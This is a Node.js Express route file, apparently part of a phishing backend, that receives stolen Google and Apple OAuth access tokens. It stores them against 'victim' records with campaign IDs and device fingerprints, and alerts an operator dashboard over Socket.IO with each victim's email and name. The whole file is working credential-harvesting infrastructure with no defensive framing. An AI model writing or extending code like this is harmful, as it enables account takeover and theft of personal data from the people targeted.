// OAuth capture routes aggregator
const express = require('express');
const router = express.Router();
const { PrismaClient } = require('@prisma/client');

// Initialize repositories and services
const prisma = new PrismaClient();
const VictimRepository = require('../../../repositories/victimRepository');
const OAuthTokenRepository = require('../../../repositories/oauthTokenRepository');
const EncryptionService = require('../../../services/encryption');
const CredentialCaptureService = require('../../../services/credentialCapture');
const { getEncryptionConfig } = require('../../../config/encryption');
const logger = require('../../../utils/logger');

// Initialize services
const encryptionConfig = getEncryptionConfig();
const oauthEncryptionService = new EncryptionService(encryptionConfig.oauthEncryptionKey);
const victimRepository = new VictimRepository(prisma);
const oauthTokenRepository = new OAuthTokenRepository(prisma);
const credentialCaptureService = new CredentialCaptureService(
  oauthTokenRepository,
  victimRepository,
  oauthEncryptionService
);

// POST /api/capture/oauth - Capture OAuth tokens
router.post('/oauth', async (req, res) => {
  try {
    const {
      provider, // 'google' or 'apple'
      tokenData, // OAuth token data
      metadata = {} // Additional metadata (campaignId, deviceFingerprint, sessionData, etc.)
    } = req.body;

    // Validate required fields
    if (!provider) {
      return res.status(400).json({ error: 'Provider is required (google or apple)' });
    }

    if (!tokenData || !tokenData.access_token) {
      return res.status(400).json({ error: 'Token data with access_token is required' });
    }

    // Validate provider
    if (!['google', 'apple'].includes(provider.toLowerCase())) {
      return res.status(400).json({ error: 'Provider must be "google" or "apple"' });
    }

    // Capture OAuth token
    const result = await credentialCaptureService.captureOAuthToken(
      tokenData,
      provider.toLowerCase(),
      metadata
    );

    // Emit Socket.IO event for admin dashboard (if available)
    const io = req.app.get('io');
    if (io) {
      const { emitVictimCaptured } = require('../../../sockets/adminHandlers');
      emitVictimCaptured(io, {
        victimId: result.victim.id,
        email: result.victim.email,
        provider,
        name: result.victim.name,
        captureMethod: result.victim.captureMethod,
        timestamp: new Date().toISOString()
      });
    }

    // Return success response with victim ID for redirect
    res.status(200).json({
      success: true,
      victim_id: result.victim.id,
      redirect_url: `/register?victim_id=${result.victim.id}`,
      message: 'OAuth token captured successfully'
    });
  } catch (error) {
    logger.error('Error capturing OAuth token:', error);
    res.status(500).json({
      error: 'Failed to capture OAuth token',
      message: error.message
    });
  }
});

module.exports = router;

